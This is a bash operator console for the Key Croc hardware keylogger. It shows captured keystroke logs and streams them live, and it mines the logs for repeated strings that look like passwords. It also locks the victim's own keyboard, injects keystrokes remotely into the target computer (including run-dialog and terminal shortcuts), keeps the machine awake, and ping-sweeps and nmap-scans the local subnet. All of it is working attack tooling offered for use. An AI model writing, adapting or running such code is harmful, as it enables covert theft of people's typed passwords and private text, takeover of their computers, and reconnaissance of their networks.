#!/bin/bash

# Title:           Croc_Live
# Description:     Live keystrokes in real-time. It operates in the terminal environment ( bash udisk/tools/croc_live.sh )
# Author:          spywill
# Version:         2.0
# Category:        Key Croc


# Variables define the source directory for loot files and the backup destination directory
source_dir="/root/udisk/loot"
backup_dir="/tmp/loot_backup"
# Set the countdown time in seconds (lockout keyboard)
countdown=60

# Variable display lines for separating output
LINE=$(printf '%0.s=' {1..40})

# Function Lock and unlock Local keyboard with QUACK LOCK and QUACK UNLOCK
function Lock_keyboard() {
	printf '\033[H\033[2J'
	QUACK LOCK
	# Loop to count down
	while [ $countdown -gt 0 ]; do
		# Print the countdown number and use carriage return to overwrite the line
		echo -ne "Local keyboard is lockout time remaining: $countdown\033[0K\r"
		((countdown--))
		sleep 1
	done
	QUACK UNLOCK
	echo -e "\nLocal Keyboard has been restored"
}

# function for Breaking while loop [i] to reset counter
reset_broken() {
	i=0
	broken=0
	break_script() {
		broken=1
		trap - SIGINT
	}
trap break_script SIGINT
}

# Function to display the main menu
display_menu() {
	printf '\033[H\033[2J'
	echo "$LINE"
	echo "                    VER:2.0"
	echo "      CROC LIVE     $(date)"
	echo "                    $(uptime | awk -F' up |, ' '{print "up " $2 ", " $3}')"
	echo "$LINE"
	echo "1) Previous keystrokes"
	echo "2) Live keystrokes"
	echo "3) Clean log files"
	echo "4) Keyboard activity"
	echo "5) Network status"
	echo "6) Remote keyboard"
	echo "7) Keyboard Giggler"
	echo "8) Option 8"
	echo "0) Exit"
	echo "$LINE"
	echo -n "Choose an option (1-8): "
}

# Function to display the submenu under Option 1
display_submenu() {
	printf '\033[H\033[2J'
	echo "$LINE"
	echo "     Previous keystrokes menu"
	echo "Characters in croc_char.log: $(find . -type f -name "croc_char.log" -exec cat {} + | wc -m)"
	echo "Keyboard: $(cat /tmp/mode)"
	echo "$LINE"
	echo "1) QUACK.log"
	echo "2) HOTPLUG.log"
	echo "3) ATTACKMODE.log"
	echo "4) CROC_RAW.log"
	echo "5) MATCHES.log"
	echo "6) CROC_CHAR.log"
	echo "7) FILTERED CROC_CHAR.log"
	echo "8) MATCH PATTERN"
	echo "9) MAIN MENU"
	echo "$LINE"
	echo -n "Choose an option (1-9): "
}

# Function to handle Option 1 (view keystrokes logs)
option_1() {
	# Function to process logs
	process_logs() {
		local log_name="$1"
		find . -type f -name "$log_name" -print0 | while IFS= read -r -d '' file; do
			echo -ne "File: $file\n"
			echo -ne "$log_name: $(wc -m < "$file") characters\n"
			cat "$file"
			echo -e "\n$LINE\n"
			sleep .5
		done
	}
	while true; do
		display_submenu
		read choice
		case $choice in
			1)
				echo "You selected QUACK.log"
				sleep 1
				process_logs "QUACK.log"
				;;
			2)
				echo "You selected hotplug.log"
				sleep 1
				process_logs "hotplug.log"
				;;
			3)
				echo "You selected attackmode.log"
				sleep 1
				process_logs "attackmode.log"
				;;
			4)
				echo "You selected croc_raw.log"
				sleep 1
				process_logs "croc_raw.log"
				;;
			5)
				echo "You selected matches.log"
				sleep 1
				process_logs "matches.log"
				;;
			6)
				echo "You selected croc_char.log"
				sleep 1
				process_logs "croc_char.log"
				;;
			7)
				echo "You selected Filtered croc_char.log"
				sleep 1
				# Find all files named "croc_char.log" in the current directory and subdirectories
				find . -type f -name "croc_char.log" -exec sed 's/\[[^]]*\]//g' {} +
				;;
			8)
				echo "You selected Match Pattern"
				sleep 1
				# Find "croc_char.log" files, remove text within square brackets
				# Extract substrings of length 3 to 16, count unique occurrences, and display those with more than 1 occurrence
				find . -type f -name "croc_char.log" -exec sed 's/\[[^]]*\]//g' {} + | \
				awk 'length($0) >= 3 { 
					for(i=1; i<=length($0)-2; i++) { 
						for(j=i+2; j<=length($0) && j-i+1<=16; j++) { 
							print substr($0, i, j-i+1)
							}
						}
					}' | \
				sort | uniq -c | \
				awk '$1 > 1 {print $1, $2}' | \
				sort -nr
				;;
			9)
				echo "Back to the main menu"
				sleep 1
				break
				;;
		 lock)
				echo "You selected lockout Local keyboard for $countdown mins."
				sleep 1
				Lock_keyboard
				;;
		 [Ss])
				echo "ENTERING ATTACKMODE HID STORAGE."
				sleep 1
				ATTACKMODE HID STORAGE
				sleep 3
				;;
		 [Hh])
				echo "ENTERING ATTACKMODE HID."
				sleep 1
				ATTACKMODE HID
				sleep 3
				;;
			*)
				echo "Invalid choice. Please select a valid option."
				sleep 1
				;;
		esac
	done
}

# Function to handle Option 2 (tail -f loot/croc_char.log)
option_2() {
	printf '\033[H\033[2J'
	# Trap Ctrl+C (SIGINT) and return to the main menu
	trap 'echo -e "\n\nYou have exited the log tail and returned to the main menu." && return' SIGINT
	echo "Starting to tail the log file: loot/croc_char.log."
	echo "Press [Ctrl+C] to stop and return to the main menu."
	echo -e "\nWaiting for keyboard activity..."
	sleep 1
	WAIT_FOR_KEYBOARD_ACTIVITY 0
	# Run the tail command and wait for user to exit using Ctrl+C
	tail -f loot/croc_char.log
	# Untrap the signal after tail command ends
	trap - SIGINT
}

# Function to handle Option 3 to back up the "udisk/loot" directory to "/tmp/loot_backup" and clean it
option_3() {
	printf '\033[H\033[2J'
	echo -e "Loot directory\n"
	sleep 1
	cd loot && ls -la
	read -p 'BACKUP & CLEAN KEY CROC KEYSTROKE FILES Y/N' user_input
	case "$user_input" in
		[yY] | [yY][eE][sS])
			# Check if the source directory exists
			if [ ! -d "$source_dir" ]; then
				echo "Error: Source directory $source_dir does not exist."
				read -p "Press [Enter] to continue..."
				return
			fi
			# Create the backup directory if it does not exist
			if [ ! -d "$backup_dir" ]; then
				echo "Creating backup directory $backup_dir..."
				mkdir -p "$backup_dir"
			fi
			# Copy the entire contents of the "udisk/loot" directory to the backup directory
			echo "Backing up $source_dir to $backup_dir..."
			cp -r "$source_dir"/* "$backup_dir"
			# Check if the copy was successful
			if [ $? -eq 0 ]; then
				echo "Backup successful!"
				# Clean (delete) all files and subdirectories inside "udisk/loot"
				echo "Cleaning up the $source_dir directory..."
				rm -rf "$source_dir"/*
				# Check if the clean-up was successful
				if [ $? -eq 0 ]; then
					echo "Clean-up successful! All files in $source_dir have been deleted."
				else
					echo "Failed to clean the $source_dir directory."
				fi
			else
				echo "Backup failed. No files were copied."
			fi
			read -p "Press [Enter] to continue..."
			;;
		[nN] | [nN][oO])
			echo -e "Returned to the main menu."
			sleep 1
			;;
		*)
			echo "Invalid choice. Please select a valid option."
			sleep 1
			;;
	esac
}

# Function to handle Option 4 (View Keyboard activity)
option_4() {
	printf '\033[H\033[2J'
	echo "You selected view Keyboard activity"
	echo "Press [Ctrl+C] to stop and return to the main menu."
	sleep 1
	reset_broken
	while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_ACTIVITY 0; do
		echo -ne "KEYBOARD ACTIVE COUNT: $((i++)) \033[0K\r"
		sleep 1
	done &
	while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_INACTIVITY 1; do
		echo -ne "KEYBOARD INACTIVE COUNT: $((i++)) \033[0K\r"
		sleep 1
	done
}

# Function to handle Option 5 (network connection status)
option_5() {
	printf '\033[H\033[2J'
	echo "You selected network status"
	echo "Press [Ctrl+C] to stop and return to the main menu."
	echo "Network check started..."
	sleep 1
	# Get network status by pinging google.com
	ping -c 1 google.com &> /dev/null
	if [ $? -eq 0 ]; then
		# Get the local IP address of the main interface
		LOCAL_IP=$(ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1)
		# Get the MAC address of the first network interface
		MAC_ADDR=$(ip link show | grep -m 1 -E "ether" | awk '{print $2}')
		# Get the public IP address using an external service
		PUBLIC_IP=$(curl -s https://icanhazip.com/)
		# Extract the subnet from the local IP address (taking the first three octets)
		SUBNET=$(echo $LOCAL_IP | cut -d. -f1,2,3)
		# Create an array to store reachable IPs
		reachable_ips=()
		echo -e "\n$LINE\n"
		echo -e "$(date)\n"
		echo "Network is up"
		echo "Local Hostname: $(hostname)"
		echo "Local IP: $(hostname -I)"
		echo "MAC Address: $MAC_ADDR"
		echo "Public IP: $PUBLIC_IP"
		echo -e "\n$LINE\n"
		iw dev wlan0 link
		echo -e "\n$LINE\n"
		grep nameserver /etc/resolv.conf
		echo -e "\n$LINE\n"
		route -n
		echo -e "\n$LINE\n"
		netstat -tulna
		echo -e "\n$LINE\n"
		traceroute google.com
		echo -e "\n$LINE\n"
		curl -Lsf --connect-timeout 2 --max-time 2 -v --write-out "\nHTTP Code: %{http_code}\nTime: %{time_total}s\n" http://ip-api.com/json
		echo -e "\n$LINE\n"
		# Scan for reachable IPs in the local network and their MAC addresses
		echo "Scanning local network for reachable IPs in subnet $SUBNET..."
		for i in {1..254}; do
			# Ping each IP in the subnet
			ping -c 1 -W 1 $SUBNET.$i &> /dev/null
			if [ $? -eq 0 ]; then
				# If reachable, resolve the IP to a hostname using getent
				HOSTNAME=$(getent hosts $SUBNET.$i | awk '{print $2}')
				# If reachable, get the MAC address using arp
				MAC=$(arp -n $SUBNET.$i | grep -i $SUBNET.$i | awk '{print $3}')
				if [ -z "$HOSTNAME" ]; then
					# If no hostname is found, just print the IP
					HOSTNAME="No hostname found"
				fi
				echo "$SUBNET.$i is reachable, MAC Address: $MAC, Hostname: $HOSTNAME"
				# Add the reachable IP to the list
				reachable_ips+=($SUBNET.$i)
			fi
		done
		# Run an Nmap scan on each reachable IP
		echo -e "\n$LINE\n"
		for ip in "${reachable_ips[@]}"; do
			echo -e "\nRunning Nmap scan on $ip...\n"
			nmap -sV -T4 -O -F $ip
			echo -e "\n$LINE\n"
		done
		# Capture network traffic on interface wlan0, with concise output (-q) tcpdump
		#tcpdump -n -i wlan0 -tttt -q
	else
		echo -e "\n$(date)"
		echo "Network is down"
		sleep 1
	fi
}

# Function to handle Option 6 (Remote keyboard)
option_6() {
	printf '\033[H\033[2J'
	echo -e "You selected Remote keyboard\n"
	sleep 1
	echo -e "Enter keystrokes from remote device\nENSURE YOU ARE RUNNING IN A REMOTE TERMINAL BEFORE STARTING!\n"
	read -p 'Start Remote keyboard Y/N' user_input
	case "$user_input" in
		[yY] | [yY][eE][sS])
			QUACK LOCK
			sleep 1
			echo -ne "\nNOTE: Not all keystroke entry are working at the moment\n
**Local keyboard will be lockout**\n
-Alternet keystrokes entry\n
-Press ALT-i will execute QUACK GUI i
-Press ALT-x will execute QUACK GUI x
-Press ALT-0 will execute QUACK GUI
-Press ALT-4 will execute QUACK ALT-F4
-Press ALT-5 will execute QUACK GUI r
-Press ALT-6 will execute QUACK GUI d
-Press ALT-7 will execute QUACK GUI l
-Press ALT-8 will execute QUACK CONTROL-ALT-d
-Press ALT-9 will execute QUACK CONTROL-ALT-t
-Press ALT-z will execute QUACK CONTROL-z
-Press ALT-c will execute QUACK ALT-SPACE ; Q c
-Press ALT-s will execute QUACK ALT-SPACE
-Press ALT-n will execute QUACK NUMLOCK
-Press ALT-l will execute QUACK CAPSLOCK
-Press ALT-p will execute QUACK PRINTSCREEN
-Press ALT-u will execute QUACK UNLOCK (local keyboard)
-Press ALT-o will execute QUACK LOCK (local keyboard)
-Press ALT-SHIFT-T will execute QUACK ALT-TAB
-Press ALT-SHIFT-E will execute QUACK ALT-ESCAPE
-Press CTRL-t will execute QUACK CONTROL-TAB
-Press F2 to return back to menu\n"
			echo -e "\n\tKEYCROC REMOTE KEYBOARD ENTER KEYSTROKES HERE\n\n"
			trap ctrl_c SIGINT
			stty -echo
			declare -a fnkey
			for x in {1..12}; do
				raw="$(tput kf"$x" | cat -A)"
				fnkey["$x"]="${raw#^[}"
			done
			read_key_press() {
				if IFS= read -r -n 1 key_press; then
					while read -N 1 -t 0.001; do
						key_press+="$REPLY"
					done
					printf -v key_code "%d" "'$key_press"
				fi
			}
			while read_key_press; do
				ctrl_c() {
					QUACK CONTROL-c ; echo -ne " CTRL-C "
				}
				case "$key_press" in
					$'\e'"${fnkey[1]}") QUACK F1 ; echo -ne " F1 " ;;
					$'\e'"${fnkey[2]}") QUACK F2 ; echo -ne " F2 \n\nYou have exited returned to the main menu" ; QUACK UNLOCK ; trap - SIGINT ; stty echo ; break ;;
					$'\e'"${fnkey[3]}") QUACK F3 ; echo -ne " F3 " ;;
					$'\e'"${fnkey[4]}") QUACK F4 ; echo -ne " F4 " ;;
					$'\e'"${fnkey[5]}") QUACK F5 ; echo -ne " F5 " ;;
					$'\e'"${fnkey[6]}") QUACK F6 ; echo -ne " F6 " ;;
					$'\e'"${fnkey[7]}") QUACK F7 ; echo -ne " F7 " ;;
					$'\e'"${fnkey[8]}") QUACK F8 ; echo -ne " F8 " ;;
					$'\e'"${fnkey[9]}") QUACK F9 ; echo -ne " F9 " ;;
					$'\e'"${fnkey[10]}") QUACK F10 ; echo -ne " F10 " ;;
					$'\e'"${fnkey[11]}") QUACK F11 ; echo -ne " F11 " ;;
					$'\e'"${fnkey[12]}") QUACK F12 ; echo -ne " F12 " ;;
					$'\E[1;2P') QUACK SHIFT-F1 ; echo -ne " SHIFT-F1 " ;;
					$'\E[1;2Q') QUACK SHIFT-F2 ; echo -ne " SHIFT-F2 " ;;
					$'\E[1;2R') QUACK SHIFT-F3 ; echo -ne " SHIFT-F3 " ;;
					$'\E[1;2S') QUACK SHIFT-F4 ; echo -ne " SHIFT-F4 " ;;
					$'\E[15;2~') QUACK SHIFT-F5 ; echo -ne " SHIFT-F5 " ;;
					$'\E[17;2~') QUACK SHIFT-F6 ; echo -ne " SHIFT-F6 " ;;
					$'\E[18;2~') QUACK SHIFT-F7 ; echo -ne " SHIFT-F7 " ;;
					$'\E[19;2~') QUACK SHIFT-F8 ; echo -ne " SHIFT-F8 " ;;
					$'\E[20;2~') QUACK SHIFT-F9 ; echo -ne " SHIFT-F9 " ;;
					$'\E[21;2~') QUACK SHIFT-F10 ; echo -ne " SHIFT-F10 " ;;
					$'\E[23;2~') QUACK SHIFT-F11 ; echo -ne " SHIFT-F11 " ;;
					$'\E[24;2~') QUACK SHIFT-F12 ; echo -ne " SHIFT-F12 " ;;
					$'\e[Z') QUACK SHIFT-TAB ; echo -ne " SHIFT-TAB " ;;
					$'\el') QUACK CAPSLOCK ; echo -ne " CAPSLOCK " ;;
					$'\es') QUACK ALT-SPACE ; echo -ne " ALT-SPACE " ;;
					$'\en') QUACK NUMLOCK ; echo -ne " NUMLOCK " ;;
					$'\ep') QUACK PRINTSCREEN ; echo -ne " PRINTSCREEN " ;;
					$'\e[5~') QUACK KEYCODE 00,00,4b ; echo -ne " PAGEUP " ;;
					$'\e[6~') QUACK PAGEDOWN ; echo -ne " PAGEDOWN " ;;
					$'\e[2~') QUACK INSERT ; echo -ne " INSERT " ;;
					$'\e[3~') QUACK DELETE ; echo -ne " DELETE " ;;
					$'\t') QUACK TAB ; echo -ne " TAB " ;;
					$'\e[F') QUACK END ; echo -ne " END " ;;
					$'\e[H') QUACK HOME ; echo -ne " HOME " ;;
					$'\033') QUACK ESCAPE ; echo -ne " ESC " ;;
					$'\E[A') QUACK UPARROW ; echo -ne " UPARROW " ;;
					$'\E[B') QUACK DOWNARROW ; echo -ne " DOWNARROW " ;;
					$'\E[D') QUACK LEFTARROW ; echo -ne " LEFTARROW " ;;
					$'\E[C') QUACK RIGHTARROW ; echo -ne " RIGHTARROW " ;;
					$'\e8') QUACK CONTROL-ALT-d ; echo -ne " CTRL-ALT-D " ;;
					$'\e9') QUACK CONTROL-ALT-t ; echo -ne " CTRL-ALT-T " ;;
					$'\ez') QUACK CONTROL-z ; echo -ne " CTRL-Z " ;;
					$'\177') QUACK BACKSPACE ; echo -ne "\b \b" ;;
					$'\x20') QUACK KEYCODE 00,00,2c ; echo -ne " " ;;
					$'\ex') QUACK GUI x ; echo -ne " GUI-X " ;;
					$'\e5') QUACK GUI r ; echo -ne " GUI-R " ;;
					$'\e6') QUACK GUI d ; echo -ne " GUI-D " ;;
					$'\e7') QUACK GUI l ; echo -ne " GUI-L " ;;
					$'\ei') QUACK GUI i ; echo -ne " GUI-I " ;;
					$'\e0') QUACK GUI ; echo -ne " GUI " ;;
					$'\e1') QUACK ALT-1 ; echo -ne " ALT-1 " ;;
					$'\e2') QUACK ALT-2 ; echo -ne " ALT-2 " ;;
					$'\e3') QUACK ALT-3 ; echo -ne " ALT-3 " ;;
					$'\e4') QUACK ALT-F4 ; echo -ne " ALT-F4 " ;;
					$'\e.') QUACK ALT-. ; echo -ne " ALT-. " ;;
					$'\ea') QUACK ALT-a ; echo -ne " ALT-A " ;;
					$'\eb') QUACK ALT-b ; echo -ne " ALT-B " ;;
					$'\ec') QUACK ALT-SPACE ; Q c ; echo -ne " ALT-SPACE-C " ;;
					$'\ed') QUACK ALT-d ; echo -ne " ALT-D " ;;
					$'\ee') QUACK ALT-e ; echo -ne " ALT-E " ;;
					$'\ef') QUACK ALT-f ; echo -ne " ALT-F " ;;
					$'\eg') QUACK ALT-g ; echo -ne " ALT-G " ;;
					$'\eh') QUACK ALT-h ; echo -ne " ALT-H " ;;
					$'\ej') QUACK ALT-j ; echo -ne " ALT-J " ;;
					$'\ek') QUACK ALT-k ; echo -ne " ALT-K " ;;
					$'\eu') QUACK UNLOCK ; echo -ne " Unlocking Local keyboard " ;;
					$'\eo') QUACK LOCK ; echo -ne " Locking Local keyboard " ;;
					$'\et') QUACK ALT-t ; echo -ne " ALT-t " ;;
					$'\ev') QUACK ALT-v ; echo -ne " ALT-V " ;;
					$'\ey') QUACK ALT-y ; echo -ne " ALT-Y " ;;
					$'\eA') QUACK ALT-SHIFT-a ; echo -ne " ALT-SHIFT-A " ;;
					$'\eB') QUACK ALT-SHIFT-b ; echo -ne " ALT-SHIFT-B " ;;
					$'\eC') QUACK ALT-SHIFT-c ; echo -ne " ALT-SHIFT-C " ;;
					$'\eD') QUACK ALT-SHIFT-d ; echo -ne " ALT-SHIFT-D " ;;
					$'\eE') QUACK ALT-ESCAPE ; echo -ne " ALT-ESC " ;;
					$'\eF') QUACK ALT-SHIFT-f ; echo -ne " ALT-SHIFT-F " ;;
					$'\eP') QUACK ALT-SHIFT-p ; echo -ne " ALT-SHIFT-P " ;;
					$'\eW') QUACK ALT-SHIFT-w ; echo -ne " ALT-SHIFT-W " ;;
					$'\eL') QUACK ALT-SHIFT-l ; echo -ne " ALT-SHIFT-L " ;;
					$'\eT') QUACK ALT-TAB ; echo -ne " ALT-TAB " ;;
					$'\e[1;3P') QUACK ALT-F1 ; echo -ne " ALT-F1 " ;;
					$'\e[1;3Q') QUACK ALT-F2 ; echo -ne " ALT-F2 " ;;
					$'\e[1;3R') QUACK ALT-F3 ; echo -ne " ALT-F3 " ;;
					$'\e[1;3S') QUACK ALT-F4 ; echo -ne " ALT-F4 " ;;
					$'\e[15;3~') QUACK ALT-F5 ; echo -ne " ALT-F5 " ;;
					$'\e[17;3~') QUACK ALT-F6 ; echo -ne " ALT-F6 " ;;
					$'\e[18;3~') QUACK ALT-F7 ; echo -ne " ALT-F7 " ;;
					$'\e[19;3~') QUACK ALT-F8 ; echo -ne " ALT-F8 " ;;
					$'\e[20;3~') QUACK ALT-F9 ; echo -ne " ALT-F9 " ;;
					$'\e[21;3~') QUACK ALT-F10 ; echo -ne " ALT-F10 " ;;
					$'\e[23;3~') QUACK ALT-F11 ; echo -ne " ALT-F11 " ;;
					$'\e[24;3~') QUACK ALT-F12 ; echo -ne " ALT-F12 " ;;
					$'\e[1;3A') QUACK ALT-UPARROW ; echo -ne " ALT-UPARROW " ;;
					$'\e[1;3B') QUACK ALT-DOWNARROW ; echo -ne " ALT-DOWNARROW " ;;
					$'\e[1;3C') QUACK ALT-RIGHTARROW ; echo -ne " ALT-RIGHTARROW " ;;
					$'\e[1;3D') QUACK ALT-LEFTARROW ; echo -ne " ALT-LEFTARROW " ;;
					$'\e[1;6A') QUACK CONTROL-SHIFT-UPARROW ; echo -ne " CTRL-SHIFT-UPARROW " ;;
					$'\e[1;6B') QUACK CONTROL-SHIFT-DOWNARROW ; echo -ne " CTRL-SHIFT-DOWNARROW " ;;
					$'\e[1;6C') QUACK CONTROL-SHIFT-RIGHTARROW ; echo -ne " CTRL-SHIFT-RIGHTARROW " ;;
					$'\e[1;6D') QUACK CONTROL-SHIFT-LEFTARROW ; echo -ne " CTRL-SHIFT-LEFTARROW " ;;
					$'\e[1;5A') QUACK CONTROL-UPARROW ; echo -ne " CTRL-UPARROW " ;;
					$'\e[1;5B') QUACK CONTROL-DOWNARROW ; echo -ne " CTRL-DOWNARROW " ;;
					$'\e[1;5C') QUACK CONTROL-RIGHTARROW ; echo -ne " CTRL-RIGHTARROW " ;;
					$'\e[1;5D') QUACK CONTROL-LEFTARROW ; echo -ne " CTRL-LEFTARROW " ;;
					$'\e[1;2A') QUACK SHIFT-UPARROW ; echo -ne " SHIFT-UPARROW " ;;
					$'\e[1;2B') QUACK SHIFT-DOWNARROW ; echo -ne " SHIFT-DOWNARROW " ;;
					$'\e[1;2C') QUACK SHIFT-RIGHTARROW ; echo -ne " SHIFT-RIGHTARROW " ;;
					$'\e[1;2D') QUACK SHIFT-LEFTARROW ; echo -ne " SHIFT-LEFTARROW " ;;
					$'\0') QUACK ENTER ; echo -ne " ENTER \n" ;;
					[[:graph:]]) QUACK STRING "$key_press" ; echo -ne "$key_press" ;;
					*)
					case "$key_code" in
						1) QUACK CONTROL-a ; echo -ne " CTRL-A " ;;
						2) QUACK CONTROL-b ; echo -ne " CTRL-B " ;;
						4) QUACK CONTROL-d ; echo -ne " CTRL-D " ;;
						5) QUACK CONTROL-e ; echo -ne " CTRL-E " ;;
						6) QUACK CONTROL-f ; echo -ne " CTRL-F " ;;
						7) QUACK CONTROL-g ; echo -ne " CTRL-G " ;;
						8) QUACK CONTROL-h ; echo -ne " CTRL-H " ;;
						10) QUACK CONTROL-j ; echo -ne " CTRL-J " ;;
						11) QUACK CONTROL-k ; echo -ne " CTRL-K " ;;
						12) QUACK CONTROL-l ; echo -ne " CTRL-L " ;;
						13) QUACK CONTROL-m ; echo -ne " CTRL-M " ;;
						14) QUACK CONTROL-n ; echo -ne " CTRL-N " ;;
						15) QUACK CONTROL-o ; echo -ne " CTRL-O " ;;
						16) QUACK CONTROL-p ; echo -ne " CTRL-P " ;;
						17) QUACK CONTROL-q ; echo -ne " CTRL-Q " ;;
						18) QUACK CONTROL-r ; echo -ne " CTRL-R " ;;
						19) QUACK CONTROL-s ; echo -ne " CTRL-S " ;;
						20) QUACK CONTROL-TAB ; echo -ne " CTRL-TAB " ;;
						21) QUACK CONTROL-u ; echo -ne " CTRL-U " ;;
						22) QUACK CONTROL-v ; echo -ne " CTRL-V " ;;
						23) QUACK CONTROL-w ; echo -ne " CTRL-W " ;;
						24) QUACK CONTROL-x ; echo -ne " CTRL-X " ;;
						25) QUACK CONTROL-y ; echo -ne " CTRL-Y " ;;
					esac
					;;
				esac
			done
			;;
		[nN] | [nN][oO])
			echo -e "Returned to the main menu."
			sleep 1
			;;
		*)
			echo "Invalid choice. Please select a valid option."
			sleep 1
			;;
	esac
}

# Function to handle Option 7 (Keyboard Giggler)
option_7() {
	printf '\033[H\033[2J'
	echo "You selected Option 7 Keyboard Giggler"
	echo "Prevent pc going to sleep."
	echo "Press [Ctrl+C] to stop and return to the main menu."
	echo "QUACK spacebar every 60 sec and then backspace."
	sleep 1
	reset_broken
	while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_INACTIVITY 60; do
		QUACK KEYCODE 00,00,2c
		QUACK BACKSPACE
		(( i++ ))
		echo -ne "Keyboard Giggler is running COUNT: $i\033[0K\r"
	done
}

# Function to handle Option 8
option_8() {
	echo "You selected Option 8"
	sleep 1
}

# Main script loop
while true; do
	display_menu
	read choice
	case $choice in
		1)
			option_1
			;;
		2)
			option_2
			;;
		3)
			option_3
			;;
		4)
			option_4 ; reset_broken
			;;
		5)
			option_5
			;;
		6)
			option_6
			;;
		7)
			option_7 ; reset_broken
			;;
		8)
			option_8
			;;
		0)
			echo "Exiting..."
			break
			;;
	 lock)
			echo "You selected lockout Local keyboard for $countdown mins."
			sleep 1
			Lock_keyboard
			;;
	 [Ss])
			echo "ENTERING ATTACKMODE HID STORAGE."
			sleep 1
			ATTACKMODE HID STORAGE
			sleep 3
			;;
	 [Hh])
			echo "ENTERING ATTACKMODE HID."
			sleep 1
			ATTACKMODE HID
			sleep 3
			;;
		*)
			echo "Invalid choice. Please select a valid option."
			sleep 1
			;;
	esac
done
